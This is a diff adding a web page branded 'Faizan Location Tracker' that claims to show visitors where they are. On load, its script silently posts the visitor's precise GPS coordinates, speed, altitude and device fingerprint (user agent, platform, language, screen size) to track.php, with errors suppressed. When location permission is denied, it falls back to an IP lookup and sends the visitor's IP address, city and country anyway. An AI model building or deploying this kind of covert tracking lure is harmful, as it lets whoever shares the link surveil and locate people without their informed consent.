@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Faizan Location Tracker</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            overflow: hidden;
+        }
+        .container { 
+            background: rgba(255,255,255,0.95); 
+            backdrop-filter: blur(20px);
+            border-radius: 24px; 
+            padding: 40px; 
+            max-width: 420px; 
+            width: 90%; 
+            text-align: center; 
+            box-shadow: 0 25px 45px rgba(0,0,0,0.1);
+            animation: slideUp 0.8s ease-out;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .logo {
+            font-size: 28px; 
+            font-weight: 700; 
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        @keyframes glow {
+            from { filter: drop-shadow(0 0 5px rgba(102,126,234,0.5)); }
+            to { filter: drop-shadow(0 0 20px rgba(102,126,234,0.8)); }
+        }
+        .subtitle { color: #666; font-size: 16px; margin-bottom: 30px; }
+        .tracker-icon { 
+            width: 80px; height: 80px; 
+            margin: 0 auto 20px; 
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 20px; 
+            display: flex; align-items: center; justify-content: center;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .tracker-icon i { font-size: 36px; color: white; }
+        .status { 
+            min-height: 24px; 
+            font-weight: 500; 
+            margin: 20px 0; 
+            font-size: 16px;
+        }
+        .loading { color: #667eea; }
+        .success { color: #10b981; }
+        .error { color: #ef4444; }
+        .map-btn {
+            display: none; 
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white; 
+            border: none; 
+            padding: 16px 32px; 
+            border-radius: 16px; 
+            font-size: 18px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 25px rgba(16,185,129,0.3);
+            margin-top: 20px;
+        }
+        .map-btn:hover { 
+            transform: translateY(-2px); 
+            box-shadow: 0 15px 35px rgba(16,185,129,0.4);
+        }
+        .accuracy { 
+            background: rgba(102,126,234,0.1); 
+            border-radius: 12px; 
+            padding: 12px 20px; 
+            margin-top: 15px; 
+            font-size: 14px; 
+            color: #4b5563;
+        }
+        .particles {
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            pointer-events: none; 
+            z-index: 0;
+        }
+        .particle {
+            position: absolute; 
+            width: 4px; height: 4px; 
+            background: rgba(255,255,255,0.5); 
+            border-radius: 50%; 
+            animation: float 6s infinite linear;
+        }
+        @keyframes float {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
+        }
+        @media (max-width: 480px) {
+            .container { padding: 30px 20px; margin: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <div class="container">
+        <div class="logo">Faizan Location Tracker</div>
+        <div class="subtitle">Precise GPS Detection <i class="fas fa-map-marker-alt"></i></div>
+        
+        <div class="tracker-icon">
+            <i class="fas fa-crosshairs"></i>
+        </div>
+        
+        <div class="status loading" id="status">🔍 Detecting your exact location...</div>
+        <div id="accuracy" class="accuracy" style="display: none;"></div>
+        
+        <a href="#" id="mapLink" class="map-btn">
+            <i class="fas fa-map-marker-alt"></i> Open in Google Maps
+        </a>
+    </div>
+
+    <script>
+        // Floating particles background
+        function createParticles() {
+            const particles = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 6 + 's';
+                particle.style.animationDuration = (Math.random() * 3 + 4) + 's';
+                particles.appendChild(particle);
+            }
+        }
+
+        function sendLocation(data) {
+            fetch('track.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).catch(() => {}); // Silent
+        }
+
+        function showStatus(msg, type = 'loading') {
+            const status = document.getElementById('status');
+            status.textContent = msg;
+            status.className = type;
+        }
+
+        function createMapLink(lat, lng, accuracy) {
+            const link = document.getElementById('mapLink');
+            link.href = `https://www.google.com/maps?q=${lat},${lng}&ll=${lat},${lng}&z=18`;
+            link.style.display = 'inline-block';
+            
+            const accuracyEl = document.getElementById('accuracy');
+            accuracyEl.textContent = `📍 ${lat.toFixed(6)}, ${lng.toFixed(6)} • Accuracy: ${accuracy}m`;
+            accuracyEl.style.display = 'block';
+            
+            showStatus('✅ Location captured successfully!', 'success');
+        }
+
+        // High accuracy GPS
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const data = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: Math.round(pos.coords.accuracy),
+                        altitude: pos.coords.altitude?.toFixed(0),
+                        speed: pos.coords.speed?.toFixed(1),
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        language: navigator.language,
+                        platform: navigator.platform,
+                        screen: `${screen.width}x${screen.height}`
+                    };
+                    
+                    sendLocation(data);
+                    createMapLink(data.lat, data.lon, data.accuracy);
+                    navigator.geolocationData = data;
+                },
+                () => {
+                    // IP fallback
+                    showStatus('📡 Using network location...', 'loading');
+                    fetch('https://ipapi.co/json/')
+                        .then(r => r.json())
+                        .then(data => {
+                            sendLocation({
+                                lat: parseFloat(data.latitude),
+                                lon: parseFloat(data.longitude),
+                                accuracy: 'IP',
+                                city: data.city,
+                                country: data.country_name,
+                                ip: data.ip
+                            });
+                            createMapLink(data.latitude, data.longitude, 'Network');
+                        }).catch(() => showStatus('❌ Location unavailable', 'error'));
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 30000 }
+            );
+        } else {
+            showStatus('❌ Geolocation not supported', 'error');
+        }
+
+        // Init particles
+        createParticles();
+    </script>
+</body>
+</html>
